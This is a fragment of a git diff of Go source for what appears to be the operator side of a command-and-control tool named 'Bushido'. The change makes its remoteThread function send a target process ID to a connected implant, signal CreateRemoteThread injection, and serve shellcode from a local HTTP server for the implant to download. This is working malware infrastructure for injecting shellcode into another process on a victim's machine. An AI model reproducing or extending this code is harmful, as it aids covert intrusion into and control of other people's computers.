@@ -313,7 +313,7 @@ func load(conn *net.Conn, fileWShellcode string) {
 }
 
 // Continue this later
-func remoteThread(conn *net.Conn, fileWShellcode string) {
+func remoteThread(conn *net.Conn, fileWShellcode string, pid string) {
 	fmt.Println()
 	fmt.Println("[!]Local File Path: " + fileWShellcode)
 	file, err := os.Stat(fileWShellcode)
@@ -322,7 +322,7 @@ func remoteThread(conn *net.Conn, fileWShellcode string) {
 		return
 	}
 	fmt.Println("[*]Sending Signal ...")
-	(*conn).Write([]byte("barCode\n"))
+	(*conn).Write([]byte("remote\n"))
 	buffer := make([]byte, 100)
 	read_len, err := (*conn).Read(buffer)
 	if err != nil {
@@ -336,7 +336,7 @@ func remoteThread(conn *net.Conn, fileWShellcode string) {
 	bufferSnapped := buffer[:read_len]
 	bufferStr := string(bufferSnapped)
 	if bufferStr != "OK\n" {
-		fmt.Println("[-]Couldn't initate CreateThread")
+		fmt.Println("[-]Couldn't initate CreateRemoteThread")
 		return
 	}
 	fmt.Println("[+]Signal was recieved and acknowledged")
@@ -361,6 +361,23 @@ func remoteThread(conn *net.Conn, fileWShellcode string) {
 		return
 	}
 	fmt.Println("[+]Download URL sent successfully !")
+	fmt.Println("[*]Sending PID ...")
+	(*conn).Write([]byte(pid))
+	read_len, err = (*conn).Read(buffer)
+	if err != nil {
+		fmt.Println("[-]Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 {
+		fmt.Println("[-]Error with length of buffer")
+		return
+	}
+	bufferSnapped = buffer[:read_len]
+	bufferStr = string(bufferSnapped)
+	if bufferStr != "OK\n" {
+		fmt.Println("[-]PID did not send")
+		return
+	}
 	fmt.Println("[*]Started python HTTP Server in Bushido dir")
 	fmt.Println("[!]Manually terminate the HTTP server after the client recieves the shellcode !")
 	cmd := exec.Command("./scripts/pythonServer.sh")
